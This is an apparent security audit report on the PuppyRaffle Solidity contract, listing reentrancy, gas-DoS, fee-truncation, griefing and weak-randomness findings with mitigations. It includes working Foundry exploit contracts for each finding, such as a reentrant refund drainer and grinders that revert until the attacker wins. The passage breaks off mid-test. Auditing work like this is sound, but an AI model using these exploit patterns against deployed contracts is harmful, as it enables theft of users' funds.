# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : Refund reentrancy drains pot via sendValue before state update

[H-1]. Reentrancy in PuppyRaffle.refund lets a malicious player withdraw entranceFee multiple times and drain the pot
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS

[M-2]. Unbounded O(n^2) scan in PuppyRaffle.enterRaffle allows gas-DoS as players[] grows (GasGriefBlockLimit)
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[M-3]. Duplicate-zero DoS: refunds create address(0) duplicates, making enterRaffle revert for rest of round
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : uint64 totalFees truncation overflows for ~93+ players (1 ETH fee) causing stuck fees

[H-4]. Truncating fee to uint64 in PuppyRaffle.selectWinner breaks balance==totalFees invariant and bricks withdrawFees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Untrusted winner callbacks can revert and block selectWinner

[M-5]. Griefable winner in PuppyRaffle.selectWinner can perma-DoS round by reverting on ETH transfer or onERC721Received
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Predictable PRNG (msg.sender,timestamp,difficulty) lets caller influence outcomes

[H-6]. Grind-to-win: Weak PRNG in PuppyRaffle.selectWinner lets anyone revert-until-win and steal the 80% prize pool
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[M-7]. Caller-controlled PRNG lets attacker force minting of Legendary puppies by grinding difficulty/time
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Payouts/fees computed from players.length ignore refunded slots

[H-8]. Fees over-accrued and permanently unwithdrawable when prize/fee use players.length instead of active pot
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless
[M-9]. Refund-induced holes make selectWinner try to pay more than balance, causing round-wide DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 5
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Refund reentrancy drains pot via sendValue before state update

## [H-1]. Reentrancy in PuppyRaffle.refund lets a malicious player withdraw entranceFee multiple times and drain the pot

## Derived From Pattern/Invariant
Refund reentrancy drains pot via sendValue before state update

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
Permissionless

## Description
refund() performs an external value transfer to msg.sender via Address.sendValue before clearing the player's slot in players[]. Because sendValue forwards all gas and there's no reentrancy guard, a malicious contract at players[playerIndex] can reenter refund(playerIndex) repeatedly while its slot is still set, receiving entranceFee on each reentry. Once control returns, the slot is finally cleared, but the attacker has already siphoned multiple entranceFee shares from the raffle pot (other players' funds). Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call forwards all gas, reentrant

    players[playerIndex] = address(0); // state cleared too late
    emit RaffleRefunded(playerAddress);
}

## Impact
Attacker can drain the raffle pot by repeatedly refunding the same ticket in a single transaction, stealing other players' funds. Direct monetary loss from the contract balance.

## Proof of Concept
1) Three honest users enter the raffle, each paying entranceFee. 2) The attacker deploys a malicious contract and enters as a player once. 3) The attacker calls refund(attackerIndex). When PuppyRaffle sends entranceFee via sendValue, the malicious contract's receive() reenters refund(attackerIndex) multiple times before the slot is cleared, extracting entranceFee on each reentry. 4) The attacker stops reentering before the contract runs out of balance, returning to the original context. Net result: attacker receives multiple entranceFee payments while owning only one ticket.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle public raffle;
    uint256 public idx;
    uint256 public max;
    uint256 public count;

    constructor(PuppyRaffle _raffle) { raffle = _raffle; }
    function setIndex(uint256 _idx) external { idx = _idx; }
    function setMax(uint256 _max) external { max = _max; count = 0; }
    function trigger() external { raffle.refund(idx); }

    receive() external payable {
        if (count < max) {
            count++;
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    Attacker attacker;
    address v1;
    address v2;
    address v3;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xFEE), 1 days);
        attacker = new Attacker(raffle);

        v1 = address(0xBEEF1);
        v2 = address(0xBEEF2);
        v3 = address(0xBEEF3);

        vm.deal(v1, ENTRANCE_FEE);
        vm.deal(v2, ENTRANCE_FEE);
        vm.deal(v3, ENTRANCE_FEE);
        vm.deal(address(this), 10 ether);
    }

    function testRefundReentrancyDrainsPot() public {
        address[] memory arr = new address[](1);

        vm.prank(v1);
        arr[0] = v1;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        vm.prank(v2);
        arr[0] = v2;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        vm.prank(v3);
        arr[0] = v3;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        // Attacker contract enters
        arr[0] = address(attacker);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        uint256 idx = raffle.getActivePlayerIndex(address(attacker));
        attacker.setIndex(idx);
        attacker.setMax(2); // 2 reentries => total sends = 3 * ENTRANCE_FEE

        uint256 potBefore = address(raffle).balance; // == 4 * ENTRANCE_FEE
        uint256 attackerBalBefore = address(attacker).balance;

        attacker.trigger(); // reentrancy happens here

        uint256 potAfter = address(raffle).balance;
        uint256 attackerBalAfter = address(attacker).balance;

        assertEq(attackerBalAfter - attackerBalBefore, 3 * ENTRANCE_FEE);
        assertEq(potBefore - potAfter, 3 * ENTRANCE_FEE);
        assertEq(potAfter, ENTRANCE_FEE); // only one ticket's worth remains
    }
}


## Suggested Mitigation
- Apply Checks-Effects-Interactions or a reentrancy guard:
  1) Effects first: set players[playerIndex] = address(0) before transferring funds, then perform the external call.
  2) Add nonReentrant (OpenZeppelin ReentrancyGuard) to refund() to prevent nested calls.
  3) Prefer pull pattern for refunds (user calls withdraw owed funds) or use call with reentrancy guard.
  Example fix:
    function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        players[playerIndex] = address(0);
        (bool ok,) = payable(msg.sender).call{value: entranceFee}("");
        require(ok, "refund failed");
        emit RaffleRefunded(playerAddress);
    }





 **Derived From** : O(n^2) duplicate check in enterRaffle enables gas-based DoS

## [M-2]. Unbounded O(n^2) scan in PuppyRaffle.enterRaffle allows gas-DoS as players[] grows (GasGriefBlockLimit)

## Derived From Pattern/Invariant
O(n^2) duplicate check in enterRaffle enables gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
Permissionless

## Description
enterRaffle appends all newPlayers to players, then performs a full nested duplicate scan across the entire players[] array. This is O(n^2) and unbounded. As players[] grows, a single additional entry must iterate over ~n^2 pairwise checks, quickly exceeding practical gas limits and causing out-of-gas reverts. This enables any EOA to grief the system by inflating players[] (via many legitimate entries) so future entries under realistic gas limits revert, degrading liveness and growth of the raffle.
Vulnerable snippet:

for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}


## Impact
As players[] grows, the nested duplicate scan in enterRaffle becomes quadratic and quickly exceeds practical gas limits, blocking further entries. This results in a liveness DoS for new participants and caps the pot and fees for the remainder of the round until selectWinner() resets the array. Availability is impacted but assets are not directly at risk.

## Proof of Concept
1) Attacker grows players[] to a large size by submitting many unique addresses over several transactions (they can batch addresses per call). 2) Because enterRaffle appends first and then performs an O(n^2) full-array duplicate scan, attempting to add even a single new player requires ~n^2 comparisons. 3) Once n is sufficiently large, any reasonable gas limit will be exceeded and the transaction reverts out-of-gas, preventing any new entries until the round ends and players[] is cleared.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract UnboundedLoops_GasGrief_Test is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1e18;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
        vm.deal(address(this), 10_000 ether);
    }

    function _batch(uint256 n, uint256 seed) internal pure returns (address[] memory arr) {
        arr = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            arr[i] = address(uint160(seed + i + 1));
        }
    }

    function test_GasGrief_OutOfGas_OnLargePlayers() public {
        // Inflate players[] in chunks without gas cap
        uint256 total = 300; // big enough to induce significant quadratic scan cost
        uint256 chunk = 50;
        for (uint256 off = 0; off < total; off += chunk) {
            address[] memory batch = _batch(chunk, 0x1000 + off);
            raffle.enterRaffle{value: FEE * batch.length}(batch);
        }

        // Prepare a 1-player entry calldata
        address[] memory one = new address[](1);
        one[0] = address(0xDEAD);
        bytes memory cd = abi.encodeWithSelector(raffle.enterRaffle.selector, one);

        // Sanity: with the same gas on a fresh instance, it succeeds
        PuppyRaffle fresh = new PuppyRaffle(FEE, address(0xFEE), 1 days);
        vm.deal(address(this), 10_000 ether);
        (bool okFresh,) = address(fresh).call{value: FEE, gas: 1_000_000}(cd);
        assertTrue(okFresh, "fresh instance should succeed with 1M gas");

        // On the bloated instance, the O(n^2) duplicate scan exceeds the gas budget and fails
        (bool ok,) = address(raffle).call{value: FEE, gas: 1_000_000}(cd);
        assertTrue(!ok, "bloated instance should fail due to quadratic scan gas");
    }
}


## Suggested Mitigation
- Remove the full-array O(n^2) duplicate scan. Use a mapping(address => bool) active to enforce uniqueness in O(1) per new player and perform only intra-batch dedup (either O(m^2) bounded by user input or a temporary mapping for O(m)).
- Validate upfront: require(p != address(0)) and require(!active[p]) for each p in newPlayers. After validation, push to players and set active[p] = true.
- On refund, set active[p] = false and remove p efficiently (e.g., swap-and-pop if you need a compact array) to avoid holes and unnecessary scans.
- This change brings enterRaffle to O(m) with a small bounded intra-batch check, eliminating the quadratic growth and gas-based DoS.


## [M-3]. Duplicate-zero DoS: refunds create address(0) duplicates, making enterRaffle revert for rest of round

## Derived From Pattern/Invariant
O(n^2) duplicate check in enterRaffle enables gas-based DoS

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
Permissionless

## Description
refund() blanks a player slot by setting players[index] = address(0). Because enterRaffle’s duplicate check naively scans the entire array and compares every pair, once two or more refunds occur, there are at least two address(0) entries. The nested loop then inevitably hits players[i] == players[j] == address(0) and reverts with "PuppyRaffle: Duplicate player". This permissionless sequence bricks all future entries for the remainder of the round, degrading liveness and capping the pot/fees.
Vulnerable snippet:

for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}


## Impact
Any two successful refunds create at least two address(0) entries. Because enterRaffle pushes new players before running a full-array duplicate scan, the presence of duplicate zeros causes every subsequent enterRaffle call to revert with "PuppyRaffle: Duplicate player". This deterministically DoSes new entries for the rest of the round (until players[] is cleared), capping pot size and fee growth.

## Proof of Concept
1) Attacker (or two colluding users) enters at least two unique addresses so they occupy distinct indices in players.
2) Each of those addresses calls refund for their respective index, leaving two players[] slots set to address(0).
3) Any later call to enterRaffle (by anyone) appends new players and then runs the nested duplicate check over the entire array. The scan encounters the two zero slots and reverts with "PuppyRaffle: Duplicate player" before evaluating the new entrants. This bricks all new entries for the remainder of the round.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract DuplicateZero_DoS_Test is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1e18;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address carol = address(0xCAAA);
    address dave  = address(0xDAD);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);
        vm.deal(carol, 10 ether);
        vm.deal(dave,  10 ether);
    }

    function test_DoS_NewEntries_BrickedByDuplicateZeros() public {
        // 1) Three distinct players enter (indices 0,1,2)
        address[] memory entrants = new address[](3);
        entrants[0] = alice;
        entrants[1] = bob;
        entrants[2] = carol;
        vm.prank(alice);
        raffle.enterRaffle{value: FEE * entrants.length}(entrants);

        // 2) Two refunds create duplicate zeros at indices 0 and 1
        vm.prank(alice);
        raffle.refund(0);
        vm.prank(bob);
        raffle.refund(1);
        assertEq(raffle.players(0), address(0));
        assertEq(raffle.players(1), address(0));

        // 3) Any new entry now reverts on duplicate check (two address(0) slots)
        address[] memory newcomer = new address[](1);
        newcomer[0] = dave;
        vm.prank(dave);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: FEE}(newcomer);
    }
}


## Suggested Mitigation
Avoid full-array O(n^2) duplicate scans and the visibility of address(0) holes:
- Maintain a mapping(address => bool) active that tracks current participants. On enterRaffle, validate: (a) no address(0), (b) no intra-batch duplicates, and (c) each newPlayers[k] is not active. If all checks pass, push addresses and set active[addr] = true for each.
- In refund, set active[msg.sender] = false and remove the slot via swap-and-pop to avoid leaving address(0) duplicates; if preserving order is not required, this is simplest. If you must keep order, at least skip address(0) in any duplicate detection (do not compare zeros against each other).
- If you keep the array scan temporarily, modify the check to ignore zeros: only compare players[i] and players[j] when both are non-zero.
These changes eliminate the duplicate-zero DoS and reduce gas by avoiding O(n^2) scans over historical entries.





 **Derived From** : uint64 totalFees truncation overflows for ~93+ players (1 ETH fee) causing stuck fees

## [H-4]. Truncating fee to uint64 in PuppyRaffle.selectWinner breaks balance==totalFees invariant and bricks withdrawFees

## Derived From Pattern/Invariant
uint64 totalFees truncation overflows for ~93+ players (1 ETH fee) causing stuck fees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
totalFees is a uint64 but fee is computed in uint256 and then cast: totalFees = totalFees + uint64(fee). With entranceFee = 1e18, fee per round is players.length * 2e17. At ≥93 players, fee > 2^64-1 and truncates, corrupting totalFees. withdrawFees() enforces address(this).balance == totalFees; once truncated, that equality can never hold, permanently locking all accrued fees. Vulnerable snippet: uint64 public totalFees; ... uint256 fee = (totalAmountCollected * 20) / 100; totalFees = totalFees + uint64(fee); require(address(this).balance == uint256(totalFees), ...);

## Impact
Permanent DoS of fee withdrawal; protocol fees become stuck in the contract (balance != totalFees), preventing any withdrawal and causing loss of funds for the fee recipient.

## Proof of Concept
Setup: entranceFee = 1 ether. An attacker supplies 93 unique addresses to enterRaffle in a single call with 93 ether. After duration elapses, anyone calls selectWinner(). The fee for this round is fee = 93 * 0.2 ether = 18.6 ether. Since type(uint64).max wei ≈ 18.446744073709551615 ether, fee > uint64 max. In selectWinner(), totalFees += uint64(fee) truncates modulo 2^64, storing only ~0.153255926290448385 ether instead of 18.6 ether. The contract balance still holds the full 18.6 ether (prize paid out already), so address(this).balance != totalFees. withdrawFees() reverts on the strict equality check, permanently locking fees.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Uint64FeeTruncationTest is Test {
    PuppyRaffle raffle;
    address feeRecipient = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeRecipient, 1 days);
    }

    function test_uint64FeeTruncationLocksFees() public {
        vm.deal(address(this), 200 ether);

        // Prepare 93 unique players
        uint256 n = 93;
        address[] memory addrs = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            addrs[i] = address(uint160(i + 1));
        }

        // Enter 93 players paying 93 ETH total
        raffle.enterRaffle{value: 93 ether}(addrs);

        // Let the raffle elapse
        vm.warp(block.timestamp + 1 days + 1);

        // Settle the round (anyone can)
        vm.prank(address(0xBEEF));
        raffle.selectWinner();

        // Round fee in wei (should exceed uint64 max)
        uint256 fee = (n * 1 ether * 20) / 100; // 18.6 ether
        assertTrue(fee > type(uint64).max, "Sanity: fee should exceed uint64 max");

        // Stored fees are truncated to uint64
        uint256 storedFees = uint256(raffle.totalFees());
        uint256 expectedTruncated = uint256(uint64(fee));
        assertEq(storedFees, expectedTruncated, "stored totalFees should equal truncated uint64(fee)");

        // But contract balance holds the full 20% of pot
        uint256 contractBal = address(raffle).balance; // ~18.6 ether
        assertTrue(contractBal != storedFees, "balance should differ from truncated totalFees");

        // Withdraw must revert due to strict equality check
        vm.expectRevert();
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Use uint256 for totalFees and avoid narrowing casts: change declaration to uint256 public totalFees; and update with totalFees += fee. Remove the brittle balance==totalFees gate; instead, prevent withdrawals during an active round via an explicit state check (e.g., require(players.length == 0, 'No active players');) and use require(address(this).balance >= totalFees, 'Insufficient balance'); to be robust against forced ETH. Alternatively, transfer the 20% fee to feeAddress immediately in selectWinner() to avoid fee accumulation accounting altogether.





 **Derived From** : Untrusted winner callbacks can revert and block selectWinner

## [M-5]. Griefable winner in PuppyRaffle.selectWinner can perma-DoS round by reverting on ETH transfer or onERC721Received

## Derived From Pattern/Invariant
Untrusted winner callbacks can revert and block selectWinner

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
Permissionless

## Description
selectWinner performs two untrusted external interactions without isolation: sending ETH to the winner and safe-minting an ERC721 to the winner. If the winner is a malicious contract, it can intentionally revert in its payable receive/fallback when ETH is sent or revert in onERC721Received during _safeMint. Either revert causes selectWinner to revert, preventing the round from completing, blocking prize distribution, NFT mint, state reset, and fee realization. Vulnerable snippets: (bool success,) = winner.call{value: prizePool}(""); require(success, "PuppyRaffle: Failed to send prize pool to winner"); _safeMint(winner, tokenId);

## Impact
A malicious contract selected as winner can revert on receiving ETH or during onERC721Received, causing selectWinner to revert and the round not to finalize. This can be exploited repeatedly to disrupt liveness. In the worst case, if the attacker controls all (or the vast majority of) player slots in a round, any invocation of selectWinner will deterministically pick an attacker-controlled address, making the function effectively non-executable until the player set changes, thereby locking the prize pool and fees in the contract. No funds are directly stolen, but users’ funds and protocol fees can be stuck and the protocol made unavailable.

## Proof of Concept
1) Attacker deploys a contract that reverts on ETH receive or onERC721Received. 2) Attacker enters the raffle using multiple distinct attacker-controlled addresses (duplicates disallowed, but Sybil entries are permitted) so that all or most players are malicious contracts. 3) After the round ends, any call to selectWinner will choose some index among players; with attacker dominance, the chosen winner will almost surely be an attacker contract. 4) The prize transfer or safe mint reverts, selectWinner reverts, and state rolls back, preventing round finalization. 5) This can be repeated indefinitely or until the player set changes. Variant: with 100% attacker-controlled participants, the DoS is persistent for every attempt.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract WinnerRevertOnReceive {
    receive() external payable { revert("NO_PRIZE"); }
}

contract WinnerRevertOnERC721 is IERC721Receiver {
    receive() external payable {}
    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        revert("NO_NFT");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xB0B), 1 days);
    }

    function _pickTs(uint256 len) internal view returns (uint256 ts, uint256 idx) {
        uint256 base = raffle.raffleStartTime() + raffle.raffleDuration();
        // Use current block.difficulty and this contract as msg.sender (we call selectWinner from here)
        uint256 i = uint256(keccak256(abi.encodePacked(address(this), base, block.difficulty))) % len;
        return (base, i);
    }

    function _enter(address[] memory players) internal {
        uint256 fee = raffle.entranceFee();
        vm.deal(address(this), fee * players.length);
        raffle.enterRaffle{value: fee * players.length}(players);
    }

    // PoC 1: Revert on ETH receive -> selectWinner reverts on prize transfer
    function test_DoS_onPrizeSendRevert() public {
        WinnerRevertOnReceive attacker = new WinnerRevertOnReceive();
        (uint256 ts, uint256 idx) = _pickTs(4);
        address[] memory players = new address[](4);
        players[idx] = address(attacker);
        // fill remaining unique EOAs
        uint256 p = 0; address[4] memory pool = [address(0x1111), address(0x2222), address(0x3333), address(0x4444)];
        for (uint256 i = 0; i < 4; i++) { if (i != idx) { players[i] = pool[p++]; } }
        _enter(players);
        vm.warp(ts);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }

    // PoC 2: Accept ETH but revert on safe mint hook -> selectWinner reverts on _safeMint
    function test_DoS_onERC721ReceivedRevert() public {
        WinnerRevertOnERC721 attacker = new WinnerRevertOnERC721();
        (uint256 ts, uint256 idx) = _pickTs(4);
        address[] memory players = new address[](4);
        players[idx] = address(attacker);
        uint256 p = 0; address[4] memory pool = [address(0x1111), address(0x2222), address(0x3333), address(0x4444)];
        for (uint256 i = 0; i < 4; i++) { if (i != idx) { players[i] = pool[p++]; } }
        _enter(players);
        vm.warp(ts);
        vm.expectRevert(bytes("NO_NFT"));
        raffle.selectWinner();
    }

    // PoC 3 (stronger): All participants are malicious -> any attempt will revert (persistent DoS until players change)
    function test_PersistentDoS_AllMaliciousParticipants() public {
        WinnerRevertOnERC721 a1 = new WinnerRevertOnERC721();
        WinnerRevertOnERC721 a2 = new WinnerRevertOnERC721();
        WinnerRevertOnERC721 a3 = new WinnerRevertOnERC721();
        WinnerRevertOnERC721 a4 = new WinnerRevertOnERC721();
        address[] memory players = new address[](4);
        players[0] = address(a1);
        players[1] = address(a2);
        players[2] = address(a3);
        players[3] = address(a4);
        _enter(players);
        vm.warp(raffle.raffleStartTime() + raffle.raffleDuration());
        vm.expectRevert();
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Make winner distribution and NFT mint non-blocking with a pull-based design: (1) Record the winner, prize amount, and rarity in state; reset players and raffleStartTime immediately. (2) Attempt a best-effort prize transfer via call; on failure, do not revert—credit claimablePrize[winner] += prize. (3) Avoid external callbacks during the main flow by either using _mint (non-safe) to prevent onERC721Received reverts, or by deferring NFT delivery to a claimNft() function that calls _safeMint and can be retried by the winner. (4) Ensure state transitions are committed before any external interaction and protect claim functions with a reentrancy guard. Example sketch:
- selectWinner: compute winner/prize/rarity, delete players, set raffleStartTime/previousWinner, totalFees += fee; try prize transfer, on failure accumulate claimablePrize[winner]; store pending rarity or mint via _mint.
- add claimPrize() to withdraw claimable funds and (optionally) claimNft() if using safeMint.
This removes untrusted callbacks from the critical path and prevents a malicious winner from halting round finalization.





 **Derived From** : Predictable PRNG (msg.sender,timestamp,difficulty) lets caller influence outcomes

## [H-6]. Grind-to-win: Weak PRNG in PuppyRaffle.selectWinner lets anyone revert-until-win and steal the 80% prize pool

## Derived From Pattern/Invariant
Predictable PRNG (msg.sender,timestamp,difficulty) lets caller influence outcomes

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
Permissionless

## Description
selectWinner derives the winner from keccak(msg.sender, block.timestamp, block.difficulty) % players.length and rarity from keccak(msg.sender, block.difficulty) % 100. Because msg.sender is the caller of selectWinner and anyone can call it, an attacker can use a helper contract that calls selectWinner and reverts the transaction unless the chosen winner is an address they control. Reverting undoes all state changes (including prize transfer), so the attacker can keep trying across blocks (varying block.timestamp) until they win, then let the transaction succeed and receive the 80% prize pool.

Vulnerable snippets:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
...
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

## Impact
Attacker can guarantee becoming the winner by grinding, receiving 80% of the pot (real ETH) and subverting game fairness.

## Proof of Concept
- Attacker funds 1 ticket among >=4 unique players.
- After raffle expiry, attacker deploys a helper contract that calls selectWinner() and immediately checks previousWinner; if not the attacker, it reverts, undoing the selection and prize transfer.
- The attacker repeats this across blocks (varying timestamp) until the PRNG picks their address; then the helper does not revert and payout is finalized to the attacker.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Grinder {
    function trySelect(PuppyRaffle raffle, address desiredWinner) external {
        raffle.selectWinner();
        require(raffle.previousWinner() == desiredWinner, "not winner");
    }
}

contract PRNGWeakness_GrindWin_Test is Test {
    PuppyRaffle raffle;
    Grinder grinder;
    address attacker = address(0xA11CE);
    address grinderEOA = address(0xAAA1);
    address p2 = address(0xB002);
    address p3 = address(0xC003);
    address p4 = address(0xD004);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        grinder = new Grinder();

        deal(attacker, 100 ether);
        deal(grinderEOA, 100 ether);
        deal(p2, 100 ether);
        deal(p3, 100 ether);
        deal(p4, 100 ether);

        address[] memory a = new address[](1);
        vm.prank(attacker); a[0] = attacker; raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p2);      a[0] = p2;       raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p3);      a[0] = p3;       raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p4);      a[0] = p4;       raffle.enterRaffle{value: 1 ether}(a);

        vm.warp(block.timestamp + 1 days + 1);
    }

    function test_GrindToWinPot() public {
        uint256 beforeBal = attacker.balance;
        // Keep trying across blocks until our desired address wins
        for (uint256 i = 0; i < 200; i++) {
            vm.prank(grinderEOA);
            try grinder.trySelect(raffle, attacker) {
                break;
            } catch {
                vm.warp(block.timestamp + 1); // change timestamp to alter RNG
            }
        }
        assertEq(raffle.previousWinner(), attacker);
        // Pot is 4 ether; winner receives 3.2 ether. Net profit (ignoring gas) > 2 ether
        assertGt(attacker.balance, beforeBal + 2 ether);
    }
}

## Suggested Mitigation
- Use a secure randomness source (e.g., Chainlink VRF) or a commit-reveal scheme where the caller cannot influence the seed.
- Never include msg.sender or other manipulable values (timestamp/difficulty) directly in RNG.
- If keeping simple RNG, decouple the entity that triggers selection from the randomness seed and include an ungameable delay (commit on one block, reveal in a future block).


## [M-7]. Caller-controlled PRNG lets attacker force minting of Legendary puppies by grinding difficulty/time

## Derived From Pattern/Invariant
Predictable PRNG (msg.sender,timestamp,difficulty) lets caller influence outcomes

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
Rarity uses uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100. The caller of selectWinner fully controls msg.sender and can repeatedly attempt selection, reverting unless the rarity falls into the Legendary bucket. By varying block parameters across attempts (new blocks; miners/validators can variably set timestamp/difficulty; in tests we vary difficulty), the attacker can force a Legendary result and let the transaction finalize only then. This also allows griefing to skew rarity distribution even when the attacker isn’t the winner.

Vulnerable snippet:

uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

## Impact
Attacker can guarantee minting Legendary NFTs to themselves (higher value) or skew rarity distribution, undermining game economics and fairness.

## Proof of Concept
- Attacker participates in the raffle.
- After expiry, attacker calls selectWinner through a helper that reverts unless (a) the attacker is the winner and (b) the computed rarity equals LEGENDARY.
- The attacker repeats across blocks (varying timestamp/difficulty) until both conditions are true, then allows success.
- Result: a rigged Legendary mint.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GrinderLegendary {
    // Calls selectWinner() and reverts unless the desired address wins AND rarity is Legendary
    function trySelectLegendary(PuppyRaffle raffle, address desiredWinner) external {
        raffle.selectWinner();
        require(raffle.previousWinner() == desiredWinner, "not winner");
        // First mint uses tokenId = 0 since contract computes tokenId = totalSupply() pre-mint for the first mint
        require(raffle.tokenIdToRarity(0) == raffle.LEGENDARY_RARITY(), "not legendary");
    }
}

contract PRNGWeakness_GrindLegendary_Test is Test {
    PuppyRaffle raffle;
    GrinderLegendary grinder;
    address attacker = address(0xA11CE);
    address grinderEOA = address(0xAAA1);
    address p2 = address(0xB002);
    address p3 = address(0xC003);
    address p4 = address(0xD004);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        grinder = new GrinderLegendary();

        deal(attacker, 100 ether);
        deal(grinderEOA, 100 ether);
        deal(p2, 100 ether);
        deal(p3, 100 ether);
        deal(p4, 100 ether);

        address[] memory a = new address[](1);
        vm.prank(attacker); a[0] = attacker; raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p2);      a[0] = p2;       raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p3);      a[0] = p3;       raffle.enterRaffle{value: 1 ether}(a);
        vm.prank(p4);      a[0] = p4;       raffle.enterRaffle{value: 1 ether}(a);

        vm.warp(block.timestamp + 1 days + 1);
    }

    function test_GrindLegendaryForSelf() public {
        bool succeeded;
        for (uint256 i = 0; i < 2000; i++) {
            vm.difficulty(i + 1); // vary block.difficulty to influence both winner index and rarity
            vm.prank(grinderEOA);
